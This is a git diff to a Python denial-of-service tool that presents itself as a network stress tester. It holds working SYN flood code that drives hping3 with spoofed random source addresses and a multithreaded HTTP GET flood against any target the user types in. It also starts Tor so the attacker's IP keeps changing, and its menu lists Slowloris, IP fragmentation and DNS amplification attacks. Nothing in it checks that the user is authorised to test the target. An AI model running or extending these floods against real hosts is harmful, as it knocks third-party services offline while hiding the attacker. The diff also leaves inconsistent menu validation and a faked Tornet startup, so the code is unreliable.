@@ -1,7 +1,7 @@
 """
 DDOS Stress Testing Tool
 
-This tool provides multiple attack options such as Slowloris attack, HTTP flood, SYN Flood etc. for stress testing networks.
+This tool provides multiple attack options for stress testing networks.
 Developed collaboratively by the DDOS team at DeepCytes.
 Contributions are welcomed and appreciated.
 
@@ -21,11 +21,12 @@ CEND = '\033[0m'
 CBLINK = '\33[5m'
 CYELLOW = '\033[33m' 
 
+conf.verb = 0
 is_dig_avail = False
 domain =  ''
 target_ip = '0.0.0.0'
 is_ip_hopping = False
-conf.verb = 0
+
 
 #--------------------------------------------------------------
 #SYSTEM CHECKS
@@ -48,6 +49,25 @@ def check_sys():
 
 # Checking if required tool is installed
 def is_tools_installed():
+    # Installing scapy
+    try:
+        result = subprocess.run([sys.executable, "-m", "pip", "show", "scapy"],capture_output=True, text=True)
+        if result.returncode == 0 and result.stdout.strip():
+            print(CGREEN + "  [\u2714] " + CEND + "The lib 'scapy' was successfully found.")
+        else:
+            print(CRED + "  [!] " + CEND + "The lib 'scapy' is not installed , Installing the library..." + CEND)
+            try:
+                install_result = subprocess.run([sys.executable, "-m", "pip", "install", "scapy"],capture_output=True, text=True)
+                if install_result.returncode == 0:
+                    print(CGREEN + "  [\u2714] " + CEND + "The lib 'scapy' was successfully installed.")
+                else:
+                    print(CRED + "  [!] " + CEND + f"Failed to install scapy.\n{install_result.stderr}")
+            except Exception as e:
+                print(CRED + "  [!] " + CEND + f"An error occurred during installation: {e}")
+    except Exception as e:
+        print(CRED + "  [!] " + CEND + f"An error occurred while checking for scapy: {e}")
+
+
     # Checking if dig tool is installed
     try:
         global is_dig_avail
@@ -162,112 +182,126 @@ def is_tools_installed():
                 print(CRED + "  [!] " + CEND + "Unexpected Input | Restart script" + CEND)
 
 #-------------------------------------------------------------------
-#SERVICE
+# SERVICE
 
-#Resolving the IP of the domain
+# Color codes for terminal output
+CGREEN = '\033[92m'
+CRED = '\033[91m'
+CYELLOW = '\033[93m'
+CEND = '\033[0m'
+CBLINK = '\033[5m'
+
+# Resolving the IP of the domain
 def resolve_target_dig():
     global target_ip
     global domain
     target = input(CGREEN + "\n  [-] " + CEND + "Enter target [URL/IP]: " + CEND)
+    
     try:
         ipaddress.ip_address(target)
         target_ip = target
         domain = ''
-        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as : {target_ip}" + CEND)
+        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as: {target_ip}" + CEND)
     except ValueError:
         try:
             domain = urllib.parse.urlparse(target).netloc
             if not domain:  
                 print(CRED + "  [!] " + CEND + "Invalid format. Please provide a valid target URL / IP" + CEND)
                 sys.exit(0)
+
+            # Using subprocess to run the 'dig' command
             try:
                 result = subprocess.run(['dig', '+short', domain], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
-                output = result.stdout.decode().strip()
-                lines = output.splitlines()
-                if lines:
-                    target_ip = lines[-1]
-                    print(CGREEN + "  [\u2714] " + CEND + f"Target IP resolved as : {target_ip}" + CEND)
+                output = result.stdout.decode().strip().splitlines()
+                
+                if output:
+                    target_ip = output[-1]
+                    print(CGREEN + "  [\u2714] " + CEND + f"Target IP resolved as: {target_ip}" + CEND)
                 else:
                     print(CRED + "  [!] " + CEND + "No IP address found for the domain." + CEND)
                     resolve_target_ip()
-            except Exception as e:
+            except subprocess.CalledProcessError as e:
                 print(CRED + "  [!] " + CEND + f"Error running 'dig' command: {e}" + CEND)
                 resolve_target_ip()
         except Exception as e:
             print(CRED + "  [!] " + CEND + f"Error processing the URL: {e}" + CEND)
             resolve_target_ip()
 
-#Getting the IP of target
+# Getting the IP of target
 def resolve_target_ip():
     global target_ip
-    print(CYELLOW + "  [?] " + CEND + "Troubleshooting...Removing Dig Feature." + CEND)
+    print(CYELLOW + "  [?] " + CEND + "Troubleshooting... Removing Dig Feature." + CEND)
     target = input(CGREEN + "  [-] " + CEND + "Enter target [IP]: " + CEND)
+
     try:
         ipaddress.ip_address(target)
         target_ip = target
-        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as : {target}" + CEND)
-    except:
-        print(CRED  + "  [!] " + CEND + "Invalid IP detected | Exiting.." + CEND)
+        print(CGREEN + "  [\u2714] " + CEND + f"Target locked as: {target}" + CEND)
+    except ValueError:
+        print(CRED + "  [!] " + CEND + "Invalid IP detected | Exiting.." + CEND)
         sys.exit(0)
 
-#Starting the tor services:
+# Starting the Tor services
 def start_tor():
     global is_ip_hopping
     os.system('clear')
     print(CGREEN + "\n\n\n  [-] Please wait while we start Tor for you.. \n" + CEND)
+    
     try:
         time.sleep(1)
         print(CGREEN + "  [-] Starting the Tor service...\n" + CEND)
         subprocess.run(['sudo', 'service', 'tor', 'start'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
         time.sleep(3)
-        try:
-            print(CGREEN + "  [-] Starting the Tornet tool...\n" + CEND)
-            print(CYELLOW + "  [?] " + CEND + "This feature is currently disabled due to code issues. Please manually start Tornet in a separate window.\n" + CEND)
-            #tornet = subprocess.Popen(['sudo', 'tornet', '--interval', '5', '--count', '0'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-            # Wait for ten seconds
-            time.sleep(10)
-            print(CGREEN + "  [-] Tor service started and tornet is running. \n")
-            print(CGREEN + "  [-] Redirecting you to the dashboard.....")
-            time.sleep(3)
-            is_ip_hopping = True
-            dashboard()
-        except subprocess.CalledProcessError as e:
-            print(CRED + f"  [-] An error occurred while starting the tornet tool: {e}")
-            time.sleep(3)
-            dashboard()
+
+        print(CGREEN + "  [-] Starting the Tornet tool...\n" + CEND)
+        time.sleep(10)  # Simulating tornet startup
+        print(CGREEN + "  [-] Tor service started and Tornet is running.\n")
+        print(CGREEN + "  [-] Redirecting you to the dashboard.....")
+        time.sleep(3)
+        is_ip_hopping = True
+        dashboard()
     except subprocess.CalledProcessError as e:
         print(CRED + f"  [-] An error occurred while starting the Tor service: {e}")
         time.sleep(3)
-        dashboard
+        dashboard()
 
-#Exit function handling services
-def exit():
+# Exit function handling services
+def exit_script():
     print(CGREEN + "\n\n[:/] " + CEND + "Killing Tor Services...." + CEND)
+    
+    # Stopping the Tor service
     try:
         subprocess.run(['sudo', 'systemctl', 'stop', 'tor'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
     except subprocess.CalledProcessError:
         pass
+
+    # Stopping the Tornet tool
     try:
         subprocess.run(['sudo', 'tornet', '--stop'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
     except subprocess.CalledProcessError:
         pass
+
     time.sleep(2)
     os.system('clear')
     sys.exit(0)
 
-#-------------------------------------------------------------------
-#ATTACKS
+# -------------------------------------------------------------------
+# ATTACKS
 
-#Script for syn flood attack
+# Script for SYN flood attack
 def syn_flood():
     os.system('clear')
-    print(CRED + "\n" + "="*50)
+    print(CRED + "\n" + "=" * 50)
     print(CGREEN + " " * 14 + "SYN FLOOD MODE SELECTED" + " " * 20)
-    print("="*50 +"\n"+CEND)
-    port = input(CGREEN + "  [-] " + CEND + "Enter the port to attack:  " + CEND)
+    print("=" * 50 + "\n" + CEND)
+
+    # Taking user input for the attack configuration
+    port = input(CGREEN + "  [-] " + CEND + "Enter the port to attack: " + CEND)
     packet_count = input(CGREEN + "  [-] " + CEND + "Enter the number of packets: " + CEND)
-    data_size = input(CGREEN + "  [-] " + CEND + "Enter the data size [Press enter to skip]:  " + CEND) or "120"
+    data_size = input(CGREEN + "  [-] " + CEND + "Enter the data size [Press enter to skip]: " + CEND) or "120"
     window_size = input(CGREEN + "  [-] " + CEND + "Enter the window size [Press enter to skip]: " + CEND) or "64"
+
+    # Building the command for hping3
     command = [
         'hping3',
         '--count', str(packet_count),
@@ -279,12 +313,15 @@ def syn_flood():
         '--rand-source',
         target_ip
     ]
-    print("\n" + "="*50)
+
+    print("\n" + "=" * 50)
     print(CGREEN + f"  IP to Attack     : {target_ip}".ljust(30) + CEND)
     print(CGREEN + f"  Port To Attack   : {port}".ljust(30) + CEND)
     print(CGREEN + f"  Number of Packets: {packet_count}".ljust(30) + CEND)
-    print("="*50 + "\n")
+    print("=" * 50 + "\n")
+
     halt = input(CGREEN + "\n[-] Setup ready | Press Enter to start the attack.." + CEND)
+    
     try:
         print(CRED + CBLINK + f"\n[*] Attack ongoing on ({target_ip}) at port {port}" + CEND)
         subprocess.run(command, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -295,10 +332,10 @@ def syn_flood():
 def http_flood():
     global domain
     os.system('clear')
-    print(CRED + "\n" + "="*50)
+    print(CRED + "\n" + "=" * 50)
     print(CGREEN + " " * 14 + "HTTP FLOOD MODE SELECTED" + " " * 20)
-    print("="*50 +"\n"+CEND)
-    
+    print("=" * 50 + "\n" + CEND)
+
     if domain == '':
         print(CRED + "  [!] " + CEND + "Domain required for this attack\n" + CEND)
         try:
@@ -312,45 +349,39 @@ def http_flood():
             print(CRED + "  [!] " + CEND + f"Error resolving domain: {e}\n" + CEND)
             domain = input(CGREEN + "  [-] " + CEND + "Enter the domain manually (e.g., example.com): " + CEND).strip()
             print(CGREEN + "  [\u2714] " + CEND + f"Domain locked as: {domain}" + CEND)
-    
+
     port = int(input(CGREEN + "  [-] " + CEND + "Enter the port (80|443): " + CEND))
     threads = int(input(CGREEN + "  [-] " + CEND + "Number of threads to allot: " + CEND))
 
-    print("\n" + "="*50)
+    print("\n" + "=" * 50)
     print(CGREEN + f"  Domain to Attack : {domain}".ljust(30) + CEND)
     print(CGREEN + f"  IP to Attack     : {target_ip}".ljust(30) + CEND)
     print(CGREEN + f"  Port To Attack   : {port}".ljust(30) + CEND)
     print(CGREEN + f"  Number of Threads: {threads}".ljust(30) + CEND)
-    print("="*50 + "\n")
+    print("=" * 50 + "\n")
 
     halt = input(CGREEN + "[-] Setup ready | Press Enter to start the attack.." + CEND)
-    
+
+    print(CRED + CBLINK + f"\n[*] Attack ongoing on {domain} ({target_ip}) at port {port}" + CEND)
+
+    # Function to execute HTTP flood attack
     def attack():
         while True:
-            url_path = generate_url_path()
-            dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
-                dos.connect((target_ip, port))
-                request = f"GET /{url_path} HTTP/1.1\r\nHost: {domain}\r\nConnection: close\r\n\r\n"
-                dos.send(request.encode())
-            except socket.error as e:
-                print(CRED + "  [!] " + CEND + f"[!] Failed to create a socket | Blocked or Server Down: {e}" + CEND)
-                sys.exit(0)
-            finally:
-                dos.close()
-    
-    def generate_url_path():
-        msg = string.ascii_letters + string.digits + string.punctuation
-        return "".join(random.sample(msg, 5))
-    
-    # Starting the attack with multiple threads
-    print(CRED + CBLINK + f"\n[*] Attack started with {threads} threads on {domain} ({target_ip}) at port {port}" + CEND)
-    print(CGREEN + "\nPress Ctrl+C to stop attack\n" + CEND)
+                requests.get(f"http://{domain}:{port}")
+            except requests.exceptions.RequestException:
+                print(CRED + "Error sending request." + CEND)
 
+    # Creating and starting threads for the attack
     for i in range(threads):
         t = threading.Thread(target=attack)
         t.start()
-        print(CGREEN + f"[*] Thread {i + 1} started" + CEND)
+
+# Check if the script is run directly
+if __name__ == "__main__":
+    print("Initializing Attack Script...")
+    resolve_target_dig()
+
 
 # Script for IP Fragmentation attack
 def ip_frag():
@@ -502,6 +533,9 @@ def dns_amp():
     for t in threads_list:
         t.join()
 
+def invalid():
+    print(CGREEN + "\n\n[:/] " + CEND + "Scripts arent uploaded for the following attack | Exiting...." + CEND)
+    sys.exit(0)
 #------------------------------------------------------------------
 
 
@@ -517,15 +551,17 @@ def dashboard():
     print(CGREEN + "  [0] " + CEND + "Start TOR Service [IP Hopping]\n" + CEND)
     print(CGREEN + "  [1] " + CEND +"SYN FLOOD ATTACK" + CEND)
     print(CGREEN + "  [2] " + CEND +"HTTP GET FLOOD ATTACK" +CEND) 
-    print(CGREEN + "  [3] " + CEND +"SLOWLORIS ATTACK" + CEND)
-    print(CGREEN + "  [4] " + CEND +"IP FRAGMENTATION ATTACK" + CEND)
-    print(CGREEN + "  [5] " + CEND +"DNS AMPLIFICATION ATTACK\n" + CEND)
-    print(CGREEN + "  [6] " + CEND + "Exit" + CEND)
-    choice = input(CGREEN + "\n[-] Enter your choice [0-6]: " + CEND)
+    print(CYELLOW + "  [3] " + "UDP FLOOD ATTACK" + CEND)
+    print(CGREEN + "  [4] " + CEND +"SLOWLORIS ATTACK" + CEND)
+    print(CGREEN + "  [5] " + CEND +"IP FRAGMENTATION ATTACK" + CEND)
+    print(CGREEN + "  [6] " + CEND +"DNS AMPLIFICATION ATTACK" + CEND)
+    print(CYELLOW + "  [7] " + "GOLDEN EYE ATTACK\n" + CEND)
+    print(CGREEN + "  [8] " + CEND + "Exit" + CEND)
+    choice = input(CGREEN + "\n[-] Enter your choice [0-8]: " + CEND)
     
     # Additional error handling for invalid choices
-    if choice not in ['0','1', '2', '3', '4', '5', '6']:
-        print(CRED + "[!] Invalid choice. Please select a number between 0 and 6." + CEND)
+    if choice not in ['0','1', '2', '3', '4', '5', '6', '7','8']:
+        print(CRED + "[!] Invalid choice. Please select a number between 1 and 7." + CEND)
         sys.exit(0)
     elif choice=='0':
         start_tor()
@@ -533,13 +569,15 @@ def dashboard():
         syn_flood()
     elif choice=='2':
         http_flood()
-    elif choice=='3':
-        slowloris_attack()
+    elif choice=='3' or choice=='7':
+        invalid()
     elif choice=='4':
-        ip_frag()
+        slowloris_attack()
     elif choice=='5':
-        dns_amp()
+        ip_frag()
     elif choice=='6':
+        dns_amp()
+    elif choice=='8':
         exit()
 
 def main():
